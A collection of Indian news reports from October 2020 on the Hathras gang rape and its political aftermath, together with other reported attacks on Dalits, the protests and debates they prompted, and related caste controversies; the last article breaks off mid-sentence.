1,"Jump to navigation Speak Now The Hathras incident and its aftermath have triggered some burning questions. Do Dalit lives matter? What's it that the Yogi government is trying to hide? Will there be change on the ground? On India Today TV Consulting Editor Rajdeep Sardesai's show News Today at 9, political leaders and Dalit activists answer these and more such questions. When asked if what has happened in Hathras is appropriate, BJP MP Sudhanshu Trivedi said, ""The UP government has been sensitive. The accused have been arrested. An SIT has been formed. It will be a fast-track trial."" Reacting to it, Congress spokesperson Supriya Shrinate said, ""There was no FIR in the Hathras case for eight days. The DM threatened the victim's family and the media. The ADG said there was no rape because no semen was found on the victim's body. This, despite her dying declaration that she was raped. It's criminal the way cops cremated the body. When will big heads roll? The buck stops with the CM."" ALSO READ: Hathras is now Peepli Live, justice byword for vote bank politics Asked if the protest is about Dalit identity, Dalit leader Jignesh Mevani said, ""In the last six years, some anti-socials from upper castes have felt that they can get away with anything. There were so many cases even before Hathras."" Is this a political battle for the Dalit vote? AAP MLA Atishi responded to this question and said, ""Today, at Jantar Mantar, we saw a citizen protest, despite a pandemic. People's blood is boiling.""When asked if the protest is meant to corner the Yogi government, she said, ""There is a complete complicity of the UP administration with the perpetrators of the crime."" So, what makes this case stand out? Joining the debate, Dalit activist Beena Pallical said that this is not the first such case in UP. ""Look at the data. And, today, an upper caste group held a demonstration in Hathras to support the accused."" Sudhanshu Trivedi said that Dalits have been killed in other states too but people only see selective outrage. Reacting to this charge, Jignesh Mevani said, ""Dalit lives matter to us, no matter where such cases happen. I want to ask why the Centre hasn't run a campaign to end the caste system and untouchability."" Supriya Shrinate also hit back at Sudhanshu Trivedi and asked why the BJP doesn't talk about the current situation. ""Crime against women in UP has gone up by 40 per cent,"" she charged. When both Supriya Shrinate and Jignesh Mevani asked why the PM was not even tweeting about the Hathras case, Sudhanshu Trivedi said, ""It would have been a problem if our leaders had been partisan by talking about crime in select states.""

1," In October, Martin Macwan, a Dalit activist organised a tribute to the 19-year-old Dalit woman who was gangraped and assaulted in Hathras, Uttar Pradesh. Macwan is one of the founders of a Gujarat-based non-profit, Dalit Foundation, which works for the empowerment of Dalit communities. In a programme named Bhim Kanya, people across villages in several states including Uttar Pradesh, Odisha, Rajasthan, Gujarat, Bihar, Maharashtra and Telangana, predominantly from Dalit communities, applied turmeric on representational images of the 19-year-old woman. According to Macwan, over thirty thousand people, across a thousand villages, participated in the programme held on 14 October. On 1 October, a division bench of the Allahabad High Court took suo moto cognisance of the Hathras crime. The court said that the incidents following the Dalit woman’s death on 29 September had shocked its conscience. Unfazed by the pleas of the victim’s family or the presence of the media, local police officials had burned her body late at night and prevented her family from performing her last rites. The bench said that the Hathras victim was entitled to “honourable, decent and dignified last rites/cremation to be performed by her family members in keeping with the customs and traditions followed by the family.” Among other things, the court noted that the victim’s mother wished to apply turmeric on her as part of the last rites but was not allowed to do so. Macwan said that society believed that “Dalits do not even have the last wish.” He described the significance of the turmeric ritual among Dalit communities and why it was central to the programme. “This is a cultural issue that whenever people die without marriage, they apply haldi because that was something to be applied at the time of wedding.” The banner designed for the event read, “Dalit bitiya ko izzat se jeene bhi nahi diya, izzat se marne bhi nahi diya”—The Dalit daughter was neither allowed to live with dignity, nor die with dignity. The idea was for the participants at the programmes to apply turmeric to copies of this poster. In villages where the posters could not be accessed, they drew their own depiction of the Dalit woman. Macwan said that it was necessary to mobilise people in rural areas. The Dalit Foundation discovered that many did not know of what happened in Hathras until they were informed by the organisation’s grassroots volunteers. “To the surprise of our colleagues, the amount of response that came from women was something they have not been able to understand,” Macwan added. Describing the turmeric ritual as a culturally powerful medium, he said, “When women brought out the haldi from their own houses and when they were applying it, they went through that personal experience as if they are doing that to their own loved ones. And something they have suffered themselves as being women, as Dalit women.” While people from Scheduled Castes and Other Backward Classes participated in large numbers, Macwan said that the participation of women from the Valmiki community was particularly remarkable. The 19-year-old from Hathras was from a Valmiki community, which is a Dalit sub-caste. “Normally they are never part of these programmes,” he said. “We saw that it was these women who were explaining to the other people that what wrong had happened. They understood it better than what I could describe. This was the reason why we did this programme, it had to be symbolic, yet very powerful and also give a political message.” The choice of date to hold the Bhim Kanya programme was also significant—it was on 14 October 1956 that BR Ambedkar converted to Buddhism in Nagpur along with lakhs of followers.

1,"Follow Us A Dalit teenage girl, who was allegedly raped by three men, has ended her life by hanging herself in this district of Uttar Pradesh, officials said. Chitrakoot Superintendent of Police (SP) Ankit Mittal said the 15-year-old girl hanged herself in her house in the Manikpur area on Tuesday. After the girl's death, her family members alleged that she was raped by three men in a forest area on October 8, the officer said. On the basis of a complaint from the victim's family members, a former village head's son Kishan Upadhyay and two others -- Ashish and Satish -- were arrested under the relevant sections of the Indian Penal Code (IPC), the Scheduled Castes and Scheduled Tribes (Prevention of Atrocities) Act and the Protection of Children from Sexual Offences (POCSO) Act, Mittal said. The family members alleged that the girl ended her life as her complaint was not registered, a charge denied by the police, who said that the victim's kin had not given any application to lodge an FIR. The SP said the post-mortem did not confirm rape and the samples would now be sent to a Forensic Sciences Laboratory (FSL). The girl will be cremated on Wednesday in the village, where elaborate security arrangements have been made. The victim's father alleged that after raping his daughter, the accused left her with her hands and legs tied and the police brought her home, but did not register an FIR. The incident comes close on the heels of a 19-year-old Dalit woman succumbing in a Delhi hospital after allegedly being raped by four upper-caste men in Uttar Pradesh's Hathras district, triggering a nationwide outrage.

1," Following his splendid inning against Rajasthan Royals, Mumbai Indians all-rounder Hardik Pandya took a knee in support of the 'Black Lives Matter' movement. He is the first player in the ongoing season of Indian Premier League to make this gesture. After reaching his half-century in the 19th over, he went down on a knee with his right arm raised to show solidarity with the movement against racism. West Indies all-rounder and Mumbai's stand-in skipper Kieron Pollard responded by raising his right fist. Social media instantly reacted. While Pandya was being lauded for showing support to the global anti-racist movement, he has been widely called out on social media for not taking a stand against the caste atrocities, discrimination against minorities and violence against women. Twitterati were quick to point out the duality of his solidarity act. What about Dalit lives, many people asked on Twitter. Will @hardikpandya7 do same for #DalitLivesMatters ? https://t.co/rHkvzebC8f — Yash Meghwal (@YashMeghwal) October 26, 2020  An upper-caste Indian cricketer took a knee in support of Black Lives Matter. Dear Hardik Pandya, have you said anything about how there are ZERO Dalits & Adivasi cricketers in India? Have you said anything about the caste atrocities committed against us? Change begins at home. pic.twitter.com/EKAcgHq1Tz — Sankul // Dalit Lives Matter (@sankul333) October 25, 2020  Hardik pandya did a black lives matter fist symbol? pic.twitter.com/JBdDw6vMeQ — DOC SHERLOCK (@BROTHER_0F_MINE) October 25, 2020  Yes Hardik Pandya will support Black Lives matter but when comes to own country he will blame Ambedkar for reservations. These elites for a reason. — Homo Sapien (@manda_odu) October 25, 2020  What if whites say ""Dalit lives matter"" and never utter a word on ""Black lives matter""? Hope you got the point. — ત્રાસી ગયો છું (@CMouthed) October 26, 2020  See why we ask celebrities to use their platforms? Hardik Pandya tweeted and now black lives matter is trending? But what about the country YOU and I live in? We had to BEG people to trend dalit lives matter? This is your land, please don't be ignorant. — B (@ambedkar4life) October 26, 2020  not hardik pandya talking about black lives matter while conveniently not speaking up on the atrocities against dalits, muslims, and women in india.... lol — s (@cowsarebabie) October 26, 2020  to @hardikpandya7, you took a knee in support of #blacklivesmatter , a movement against structural oppression. but do you have the guts to recognise caste oppression in India? did you speak up about Hathras? will u stand up to your own teammates who display caste supremacy? pic.twitter.com/QCfa5GaTKK — Agatha Srishtie #DALITLIVESMATTER (@SrishtyRanjan) October 25, 2020  Indians like to be cool but they are conditioned to be smart. Cool by sporting a black band and supporting black lives matter Smart by keeping their mouth shut on caste and bigotry Smart enough to know when to be cool and when to mind ones own business. — Atticus Balgit Finch (@malayaliatticus) October 26, 2020  After the match Pandya even tweeted a picture of himself with the caption ""#BlackLivesMatter"". Last week, West Indies Test skipper Jason Holder, who plays for the Sunrisers Hyderbad, had expressed his disappointment over none of the IPL teams taking a knee in solidarity with the movement, which, he felt, went unnoticed in the league. ""To be honest, I haven't had one conversation up here around it (BLM). Sometimes it seems it has gone unnoticed, which is a sad thing. ""I guess it's for us to re-highlight the importance of it, for people to understand what is happening in the world,"" Holder had said. The ""taking a knee"" gesture started in the West Indies' Test series in England this summer in protest against racism after African-American George Floyd was killed by an on-duty white police officer in Minneapolis. But the gesture was later discontinued for the subsequent tours of Pakistan and Australia."

1,"When Kishore did not return in the night, his family thought that he might have gone somewhere with the contractors. The next morning, Kishore's family got to know that a fire had broken out in the liquor shop. Congress-ruled state of Rajasthan has been in the news lately for all the wrong reasons. Several incidents of rapes and gangrapes have been reported in the the state in this month alone. And now, reports of another gut-wrenching incident are coming from Alwar district of the state, where a Dalit salesman was burnt alive by a liquor contractor. According to reports, a salesman working in a liquor shop in Kumpur village had asked for his salary due for five months. After the salesman demanded his salary, the liquor contractor allegedly poured petrol on him and burnt him alive in a deep freezer. SHO Dara Singh told that a report has been filed in Khairthal police station by victim’s brother Roop Singh Dhanka who is a resident of Jhadka. Roop Singh told the police that his brother Kamal Kishore used to work with liquor contractors Rakesh Yadav and Subhashchand. The liquor shop was being run in a container at Kumpur-Bhagori turn. Singh alleged that his brother was assaulted and threatened whenever he demanded his salary. As told by Roop Singh, in the evening on October 24, Rakesh Yadavand Subhashchand came to Kishore’s house and took him with them. When Kishore did not return in the night, his family thought that he might have gone somewhere with the contractors. The next morning, Kishore’s family got to know that a fire had broken out in the liquor shop. Victim’s family members reached at the site and opened the container in which the liquor shop was being run in the presence of the police. On opening the container, they found Kishore’s charred body placed in sitting position in the deep freezer. Roop Singh has accused Rakesh Yadav and Subashchand of burning his brother alive after pouring petrol on him and then setting the container on fire. A case has been registered against Rakesh Yadav and Subhashchand under sections 302,436,120B of the Indian Penal Code and under the relevant provisions of the SC/ST Act. Enraged by the horrific incident, the locals have raised questioned as to why the liquor shop was being run inside a container. The family of the victim refused to send the body for postmortem demanding judicial inquiry in the case. On assurance from DSP Tarachand, the body was allowed to be sent for postmortem. Both the accused are absconding. The state president of BJP in Rajasthan, Dr. Satish Poonia posted a tweet condemning the incident. Likening Rajasthan with Somalia in Africa, Poonia said that there was no law and order in the state like the African country. करौली जिले में पुजारी को जिंदा जलाने की घटना के बाद “अलवर;सेल्समैन ने सैलरी मांगी तो..जिंदा जलाया” पढ़कर ऐसा लगता है कि हम अफ्रीका के सोमालिया जैसे देश में रह रहे हैं,जहां कानून नाम की कोई व्यवस्था नहीं है, क्या गृहमंत्री गहलोत को अपने पद पर रहने का हक है?#CrimeCapitalRajasthan pic.twitter.com/BR0AyETvbt Earlier this month, a temple priest Babulal Vaishnav was burnt alive by some people for preventing them for encroaching the temple land.

1,"Jump to navigation Speak Now In 1977, several Dalits had been killed by upper-caste landowners in Bihar's Belchi village. Out of power, Indira Gandhi sensed a political moment. She travelled by train, jeep and tractor before settling for an elephant ride to negotiate muddy and water-logged tracks amid heavy rain. Her address to the community proved to be a game changer. On Thursday (October 1), more than four decades later, her grandchildren, Priyanka Gandhi Vadra and Rahul Gandhi, were taken into preventive custody by the Uttar Pradesh Police when the two Congress leaders tried to visit a village in Hathras district that has lost a Dalit girl to the savagery of four upper-caste men. While Rahul fell on the ground and grabbed headlines, his sister, a day later, attended a prayer meeting at Delhi's Valmiki Mandir and said every woman of the country must question the government and seek justice for the daughter of Hathras. The 19-year-old victim belonged to the Valmiki community. These are different times, dominated by social media and various other new factors. It's unfair to compare the Gandhi siblings with their grandmother. Hathras isn't in Bihar. But Bihar, UP's neighbouring state, has its Assembly election coming up in October-November. And the Opposition has been on a constant lookout for its political moment since 2014 when Narendra Modi stormed the Dilli Darbar. THE PROTESTS AND OUTRAGE The death of the Hathras girl on September 29, about a fortnight after she was allegedly gang-raped and brutalised in her village, has triggered nationwide outrage and protests. If the crime was shocking, the handling of the case has given ammunition to the political Opposition to target the Yogi Adityanth-led BJP government in the state. Despite the heinous nature of the crime, there was an inexplicable delay in registering an FIR. After she succumbed to her injuries, cops hurriedly and forcibly burnt the body in an open field in the dead of the night after locking the family members inside their village home. Then the police cited post-mortem and forensic reports to claim no semen was found in samples, and denied the gang rape charge. This disregarded the rape definition and ignored the girl's dying declaration in which she had said four men raped and brutalised her. Cops also barricaded the entire village and issued prohibitory orders to block media coverage. They also pushed, shoved and detained senior politicians, also including TMC's Derek O'Brien, who wanted to meet the victim's family. The District Magistrate was also seen pressuring the victim's family members into ""not changing their statements."" HOW HATHRAS CAN IMPACT BIHAR ELECTION The impact may not be on the outcome but it will certainly change the poll narrative. The gruesome crime in Hathras can dent the image of the ruling NDA (comprising Chief Minister Nitish Kumar's JDU and the BJP) in Bihar where Dalits account for around 17 per cent of total voters. Protests against the Hathras incident have already started in Bihar. NK Choudhary, a senior social and political analyst from Patna, told India Today, ""The Hathras issue will certainly have some impact on the Bihar election. It may dent the NDA's image and puncture its claims of good governance and government with a difference."" Hathras may bolster the charge of the Opposition's Mahagathbandhan (comprising Tejashwi Yadav's RJD, the Congress and the Left parties) that the BJP is anti-Dalit, anti-women and pro-upper castes. Remember, women have played a key role in Nitish Kumar's election victories. He has announced a number of doles for the crucial voting bloc. ""Unlike in UP, there is no mass mobilisation of Dalits in Bihar. They are fragmented in blocs led by Chirag Paswan of the LJP, Jitan Ram Manjhi of the HAM (Secular), Ashok Choudhary of the Congress and Shyam Rajak of the RJD. But the election narrative may change,"" NK Choudhary said.""Issues of Dalits and women's safety may be raised by the Opposition more vociferously. Parties may consider giving more seats to Dalit candidates. NDA constituents Chirag Paswan and Jitan Ram Manjhi may have more bargaining powers in seat sharing,"" he, however, added. The NDA may announce its seat-sharing arrangement anytime. BJP national president JP Nadda and Union home minister and senior party leader Amit Shah held a meeting with Chirag Paswan over the issue on Thursday (October 1). Chirag Paswan has already criticised Nitish Kumar over various issues and has indicated his LJP will fight on 143 seats (out of the total 243) if it does not get a good deal. The return of former Chief Minister Jitan Ram Manjhi, another Dalit leader like Chirag Paswan, to the NDA fold has made matters more complicated. The LJP said its future course will be decided at its parliamentary board meeting at 5 pm on Saturday (October 3). The Mahagathbandhan has finalised seat sharing arrangements. The RJD is likely to give 70 seats to the Congress and 30 to the Left parties. ""What happened in Hathras is inexplicable because such incidents have political fallouts. It was in the interest of the BJP-led UP government to handle the case well,"" NK Choudhary said. Chirag Paswan has spoken to Uttar Pradesh CM Yogi Adityanath and asked him to take stringent action in the Hathras case. Udit Raj, national chairperson, All India Confederation of SC/ST Organisation, told India Today from Patna that Hathras is a sensitive issue and it has affected people in poll-bound Bihar. ""It's an election factor. The delay in registering an FIR, the hurried burning of the body and the mishandling of political protests will have a negative impact on the BJP, and the JDU will also bear the brunt. Privatisation was anyway a big issue for Dalits in Bihar,"" said the former BJP MP who is now a Congress spokesperson. But DM Diwakar, former director, AN Sinha Institute of Social Study (Patna), told India Today, that parties in Bihar are interested only in sharing power. ""Nobody is bothered about Dalit emancipation. Dalits would have gotten justice, had there been land reforms and housing for them had the recommendations of various commissions been implemented."" ""They are at the bottom when it comes to literacy, education, health and nutrition because only lip-service has been done. Every political party has a Dalit morcha. But the BJP and others exploit Dalits as Hindu votes. They want Dalit faces, and not Dalit leaders,"" DM Diwakar said. ""There is no doubt that areas which have seen Dalit movements have seen change. But after 1991, also when the Left movement weakened, the situation got worse. Under the influence of liberalisation, public policy became anti-poor. Since Dalits have the largest share among the poor, they are the most affected. When you kill PSUs, there are no jobs or reservation anyway. The Ram temple movement came to counter the Mandal push."" The Election Commission of India (ECI) has announced dates for Bihar Election 2020. All 243 seats in the state will go to the polls in three phases (October 28, November 3 and 7). November 10 will be the results day. It will be interesting to see how much Belchi gains netas are able to extract from Hathras.

1,"Ajmer: Days after a 19-year-old girl from Hathras was raped by four upper-caste men, another incident came to light from Rajasthan's Ajmer. A Dalit woman claimed that she had been gang-raped by 3 men on Tuesday at a village in Ajmer. The woman, who is married, approached the police on Wednesday and lodged a complaint. On September 29, the woman had gone to meet her mother as the latter was sick. The woman was on her way to Daurai village when a man identified as Teepu approached her. Teepu allegedly dragged the woman to a nearby field and raped her. After raping the woman, Teepu called two of his friends to the spot who allegedly raped her. The three men held the married Dalit woman hostage for hours and dropped her on a nearby road before fleeing from the spot. The aggrieved woman went to her mother's home where she narrated her ordeal, The Times of India reported. Following this, the woman went to the police station with her mother and lodged a case. The police launched a probe into the case and sent the woman for a medical examination. The incident came to light one day after the 19-year-old gang-rape victim was cremated by the UP Police, without the consent of her family. Gang-raped by four men, the Dalit girl had been brutally gang-raped by four upper-caste men. After the incident surfaced, several protests were staged across the country. Several people staged protests at India Gate and UP Bhawan on Wednesday and were detained by the police. The protests were not limited to Delhi, members of the Congress Party, women activists and students demanded stringent action against the accused by protesting in Kolkata, Maharashtra and Uttar Pradesh.

The police in Uttar Pradesh said a dismembered body of a 15-year-old Dalit girl was found in a maize field in Kanpur’s Dehat district on Saturday, PTI reported. The police suspect that the girl, who was missing for a week, was killed over a property dispute. Superintendent of Police of Kanpur Dehat Keshav Kumar Choudhary claimed the girl was abducted and killed by her uncles, ruling out the possibility of rape. Choudhary said they have arrested two of the girl’s uncles, 65-year-old Brij Lal and 60-year-old Jiya Lal. They have allegedly confessed to killing her over a property dispute. The teenager’s father had accused them of murdering his daughter over the land dispute, according to Hindustan Times. The police officer said local residents found the girl’s body 500 metres away from her native Gaholia Rura village. Her body was partially eaten, possibly by wild animals, he added. Choudhary said the body of the girl has been sent for autopsy and they were waiting for the results to ascertain the exact cause of her death. Meanwhile, the police said a four-year-old girl was allegedly raped by her relative under the limits of Khair police station in Aligarh. Superintendent of Police of Aligarh Rural Shubham Patel said the girl was admitted to a hospital and her condition was stable. The incidents came amid nationwide outrage over the gangrape and murder of a 20-year-old woman in Hathras district of Uttar Pradesh. Opposition leaders have highlighted several other violent incidents in the state in recent days, including allegations of a similar gangrape of a Dalit woman in Balrampur district of Uttar Pradesh. On Saturday, Uttar Pradesh Congress Chief Ajay Kumar Lallu said there was “lawlessness” in the state after he was placed under house-arrest. Ninety-two former civil servants have also written to Uttar Pradesh Chief Minister Adityanath, expressing concern at the “brazen violation of the rule of law” in the state in connection with the Hathras gangrape case. “Just when we thought that nothing could numb our consciences and brains further, the handling of the Hathras incident by the Uttar Pradesh administration has shown that, as a nation, we are plumbing the depths of depravity and callousness in governance,” their statement said. However, Adityanath had on Friday asserted that his government was committed to the safety of women. “Those who even think of harming mothers and daughters in Uttar Pradesh, their destruction is assured,” the chief minister said in a tweet. “They will get such punishment that will set an example for the future. The government of Uttar Pradesh is committed to the safety and security and development of all mothers and sisters. This is our commitment and promise.”"

1," Viduthalai Siruthaigal Katchi MP Thol Thirumavalavan’s demand to ban the Manusmirti, the ancient book of Hindu laws, have sparked a row with the members of Hindu right-wing Bharatiya Janata Party (BJP) seeking his apology for his alleged remark that Manusmriti denigrated women. BJP workers on Tuesday staged agitations across Tamil Nadu demanding that Thirumavalavan apologise for his remark. The VCK cadres countered it by flash protests and they allegedly attacked saffron party office-bearers at Madurai. Actor Khushbhu, who quit Congress and joined BJP earlier this month, was arrested by the Chengalpet police on Tuesday while on her way to Chidambaram to take part in a protest against Thol Thirumavalvan. The VCK leader has been booked by Chennai Police on Friday after a complaint by the BJP. He faces charges under various IPC sections relating to the outraging of religious feeling, the vilification of religion, causing alarm to the public and others. Thol.Thirumavalavan on Saturday participated in a protest held in Valluvar Kottam in Chennai and said, “The Manusmriti that divides humans and demeans women should be banned. On September 27, Periyarists in Europe conducted a webinar and I gave a 45 minutes speech. A few groups edited out five minutes from the forty minute video and claimed that I am demeaning women. The Hindutva groups are circulating the false message against me.” He added that leaders like Periyar, MC Raja and Ambedkar burnt the Manusmriti. Now a century later, VCK is reiterating the demand to ban Manusmriti. Explaining his words, Thirumavalavan said that he was not demeaning women and requested women from all segments to listen to the entire speech. He also thanked ‘democratic forces’ and parties who extended support for the protest. VCK’s allies including the DMK and Congress have supported Thirumavalavan. In a statement, DMK president MK Stalin said, “Thirumavalavan spoke citing Sanatana-Varnashrama-Manusmriti texts that demean women. This is the outcome of the awareness created by Thanthai Periyar and Ambedkar… It is condemnable that police instead of taking action against the communal groups that has twisted the statement of Thirumavalavan took action against the VCK leader himself.” Gujarat MLA Jignesh Mevani also extended his support to Thirumavalavan’s appeal to ban the Manusmriti.

1,"Four days after their wedding, the Madras High Court on Thursday directed AIADMK MLA A Prabhu to produce on Friday his newly wed wife S Soundarya before it, acting on a habeas corpus petition filed by her father alleging that his daughter was kidnapped. A division bench of Justices M M Sundresh, and D Krishnakumar also asked the petitioner to appear before the court on Friday. Swaminathan, the girl’s father who works as a priest at a temple in Thiyagadurgam, 235 km from here in the newly formed Kallakurichi district, has alleged that Prabhu had married his daughter after kidnapping her. The bench directed Prabhu to produce his wife before the court when the matter came up for hearing on Thursday. The MLA, who belongs to the Scheduled Caste, married S Soundarya in a simple ceremony in the presence of his family members on Monday amid drama as the girl’s father attempted to self-immolate outside the venue. The father also moved the High Court on the same day. Read: AIADMK Dalit MLA marries Brahmin girl; father alleges daughter was kidnapped Even as the father levelled allegations, Soundarya released a video message saying that her wedding with the MLA took place with her “consent” and that she was neither abducted nor threatened. S Soundarya, wife of #AIADMK MLA from Kallakurichi, says she was neither threatened nor abducted by the legislator. ""I married him on my own. The wedding took place with my consent,"" she says in the video 👇Her father had alleged that Prabhu had abducted Soundarya @DeccanHerald pic.twitter.com/sXaohaD1aK — Sivapriyan E.T.B | சிவப்பிரியன் ஏ.தி.ப (@sivaetb) October 6, 2020 “MLA Prabhu and I have been in love for the past four to six months. Since my parents objected to my relationship with Prabhu, I stormed out of my house and have now married him. The marriage took place with my consent and not because of any threat. I was neither abducted nor threatened,” the 19-year-old said in her message. A Prabhu, a first-time legislator, is 36 years old, while the girl is 19. Prabhu was close to Soundarya’s family for the past 10 years and had enjoyed a good rapport with them and that is how the couple came to know each other. The MLA said though he had known Soundarya for the past 10 years, their relationship began only a few months ago. “The girl’s family did not accept our relationship, but the wedding took place with the consent of my family members. My wife is a major and she took the decision consciously. To say I abducted her is absurd,” the legislator said.

The three girls are sisters, and were asleep on the top floor of their home in the village of Paraspur when the attack took place at around 1.30am. The two younger girls, aged eight and 12, received minor injuries while the eldest, 17, suffered disfiguring wounds to her face. All three have been admitted to the local hospital for treatment. Police told The Independent that they are investigating the possibility that the attacker was known to the family. The Additional Superintendent of the Gonda district police, Mahendra Kumar, said they have four teams working on the case and await the statement of the girls to proceed with their investigation. While the family has alleged it was an acid attack, Kumar said the police are yet to identify which chemical was used in the attack and are carrying out a forensic examination. The father of the girls, Ram Avatar, said in a statement to the police and local media that he was sleeping on the verandah while the three girls were asleep on the roof of the house on Monday night. “When my daughters screamed, I immediately opened the door and grabbed one of them. When my vest burned, I got to know that somebody had thrown acid at them,” he told a local TV news channel. The father said the family had no animosity with anyone else in the village, and he could not think why his daughters would be attacked. Uttar Pradesh state is already at the centre of national tensions surrounding the rape and murder of a 19-year-old Dalit woman in Hathras, a case which has dominated the news amid allegations of police mishandling the case and targeting protesters with arrest. The Dalit community is the lowest of the four major divisions in the Hindu caste system, and are included in a group known as Scheduled Castes who are provided additional protections in Indian law. They comprise about 16 per cent of the total Indian population according to the 2011 census. The community still battles discrimination in various forms and has long been at the receiving end of caste-based violence in India.

Photo: APrabhuOfficial/Facebook   Chennai, October 7 A Dalit AIADMK MLA’s marriage to a 19-year-old Brahmin woman has met with staunch opposition from her father, who after a scuttled suicide attempt, alleged that the legislator abducted his daughter, a charge denied by both the bride and groom. When the MLA, A Prabhu, tied the knot with S Soundarya at his residence at Thiyagadurugam in Kallakurichi district on Monday, her father Swaminathan, a temple priest, dropped in, police said. He reportedly said he would “gift” the couple his “life” and attempted to set himself ablaze after pouring petrol on his body. However, he was overpowered by police personnel and party workers. At the local police station, the priest was advised against taking extreme steps and asked to give an undertaking that he would not attempt to kill himself. The priest said his objection to the marriage was not the caste factor, but the difference in age between his daughter and the MLA. The legislator was 36-year-old and his daughter was 19 and a groom who was 17 years older than the bride would not be a suitable match, he said. Also, Swaminathan alleged that his daughter was abducted by the MLA and that she was “lured and diverted” and made to marry Prabhu against her wishes. Soundarya, however, asserted that she married Prabhu out of her own volition, adding she was in love with the MLA for about four months. In a video post, in which she appeared alongside her husband, the MLA, a B Tech graduate, too dismissed the claim of the priest that his daughter was kidnapped. “We were in love for about four months and when I sought the permission of her parents to marry her they denied it,” the MLA said. Later, he said he married Soundarya only based on her wish and with her whole hearted consent. Swaminathan claimed that due to the influence of the legislator he could not lodge a complaint with police against him and alleged that he has received threats. The MLA, however, dismissed the priest’s claim as false. “I did not threaten or intimidate her family members or lure Soundarya. Our marriage was based on mutual consent,” Prabhu said. — PTI Tribune Shorts A - A + What do you think?

1,"The brutal gang rape and death of 19-year-old Manisha Valmiki, belonging to a lower caste from Hathras in the the state of Uttar Pradesh in India, and the police action thereafter has sent shock waves all over the world. This brutality committed by perpetrators from an upper caste, as caste motivated hate crimes, must be condemned in the strongest way. Dalit and human rights organisations in the UK have issued an open joint statement condemning this heinous crime and demanding strict action against the culprits and also against those officials who tried to cover up this incident. Atrocities against women have become a matter of concern and shame for all who love humanity and India. Santosh Dass MBE, President, FABO UK said that the case of Miss Manisha Valmiki is yet another sickening gang rape and murder of a Dalit woman that has caused global outrage. “Everything about the clear failure and cover-up in handling of this case is abhorrent, including reports that Manisha’s body was set alight by petrol in a so-called cremation in the middle of the night. Members of Manisha’s family were not allowed to conduct the funeral, be present, or to carry out the last rites. This is cruelty beyond measure. My heart as a woman and mother bleeds knowing this.” “The Chief Minister of UP, Mr Yogi Adityanath, whose worldview on women is that they are not capable of being left free or independent, must resign. We also demand that he and the police officers and officials concerned must be charged under the SC/ST Atrocities Act and the rapists be arrested,” she said. Arun Kumar, the General Secretary, FABO UK said that the gang rape of this young Dalit woman is not the first one and won’t be the last one. “We read stories every day where Dalit women are beaten, paraded naked, raped, and killed. The numbers are increasing every day. After this brutal incident, such crimes have occurred in Balrampur, Azamgarh, and Bulandshehar. These are all caste motivated hate crimes. These brutalities become news items and are forgotten. It is time to act and stop these heinous crimes. The culprits must be punished in a set period of time. The officials who try to cover up such crimes must be sacked and charged.” Arun said that if India wants to become a world leader, it must respect and give equal treatment to all, irrespective of their caste, religion, and gender. An open joint statement undersigned by Dalit and other organisations in the UK was submitted to the High Commissioner of India in London and read as follows: Open Joint Statement to the High Commissioner of India in London for the attention of the Prime Minister of India – 2 October 2020 1. We the undersigned organisations and our supporters demand immediate justice for Miss Manisha Valmiki who died in hospital on 29 September 2020 from extreme injuries sustained from a brutal gang-rape on 14 September in Hathras, Utter Pradesh (UP), India. 2. Amongst our demands below, we also demand the resignation of the Chief Minister of UP and that the police officers involved be charged under the SC/ST Atrocities Act. Enough is enough! 3. Miss Manisha Valmiki’s is yet another sickening gang rape and murder of a Dalit woman that has caused global outrage. This case raises many serious questions about the apathy of the Indian government, police and the hospital authorities. Despite repeated pleas from the family, the local police failed to register a case of gang rape leaving the accused to roam around free for five days. 4. If Miss Manisha’s death wasn’t enough, the local police officers and officials violated her dead body and cremated it in the middle of the night without allowing members of her family to be present or to carry out the last rites. This is cruelty beyond measure. Furthermore, it is reported the police are stopping politicians meeting the family to support and sympathise with them. It is also reported the family have been threatened and their phones have been confiscated. We will never forgive or forget this – how India is failing its daughters. 5. Miss Manisha’s murder has once again shone a light on India’s horrific Caste system, a system that ranks human value based on the presumed supremacy of the so-called high Castes. India’s Government despite its slogan ‘Beti bachao, beti padhao’ has failed Dalit girls and women. Dalit lives are considered worthless and have been for millennia. Essentially, the Indian Government has failed Indians. 6. The Guardian rightly reported on 1 October “India is the most dangerous country in the world to be a woman and it is women from the lower castes who bear the brunt of the sexual violence”. The 2019 data Crime in India states 10 Dalit women were raped in India everyday. One third of these cases were reported from the lawless states of Uttar Pradesh and Rajasthan. Reported is the operative word. A culture of patriarchy and maintaining family honour means there are many more that are not formally reported to the police. 7. In other cases there is evidence police fail to even register the crimes. This is unacceptable. These casual rapes and gang rapes of Dalit women and girls, where so-called high Caste rapists go free with impunity point to a failed democracy and sick society. 8. From 2018, the rate of crime against all women in India has risen by 7.3%, with the country recording an average 87 rape cases every day in 2019. India reported 405,861 cases of crimes against women in 2019 and Uttar Pradesh topped the list with 59,853 such incidents, according to the annual National Crime Record Bureau’s “Crime in India” 2019 report. 9. Miss Manisha Valmiki has been subjected to a horrendous, serious and brutal crime.

1," By Abdul Bari Masoud New Delhi, Oct 2: Despite covid-19 pandemic fear, thousands of people thronged to Jantar Mantar here on Friday to join the Citizen’s Protest against the gang rape and murder of a Dalit girl in Hathras, demanding resignation of Uttar Pradesh, Chief Minister Yogi Adityanath for allegedly protecting the perpetrators of crime. Leaders of different political parties also took part in the Protest saying the UP government has no right to stay in power alleging that the culprits are being shielded because they happen to be from the CM’s caste.  Leaders and activists described the Yogi government with “jungle raj , ghoonda raj, lawlessness” and asked him to step down in the wake of Hatras gangrape and brutal murder of 19- year girl Manisha on September 14. Opposition leaders, including Sitaram Yechury, D Raja, Dr S Q R Ilyas, Chandrashekhar Azad, and Brinda Karat, were seen at the protest, while activists such as Jignesh Mevani, Prashant Bhushan and Kanhaiya Kumar were among the demonstrators as well actor Swara Bhasker was present there, too. Protesters hold placards at Jantar Mantar to protest against the death of a 19-year-old Dalit woman in Hathras, in New Delhi. Addressing the protesters, they all sought resignation of UP CM. Left leaders questioned the silence of the Modi government over the issue. “The silence of the central government and the top leadership of the BJP on such a heinous crime and the UP government’s response thereafter speak volumes about the authoritarian and anti-democratic ‘chehra’, ‘chaal’, ‘charitra’, and ‘chintan’ of the ruling party,” said Yechury as saying. “The Uttar Pradesh government has no right to stay in power. Our demand is that justice should be served,” he added. AAP National Convenor and Delhi CM Arvind Kejriwal demanded that the culprits should be hanged till death so that such an incident is never repeated in the country. Aam Aadmi Party’s chief spokesperson Saurabh Bhardwaj said, “Media and the BJP are repeatedly asking why the people are protesting against the Hathras rape case.” He recalled that lakhs of people gathered at 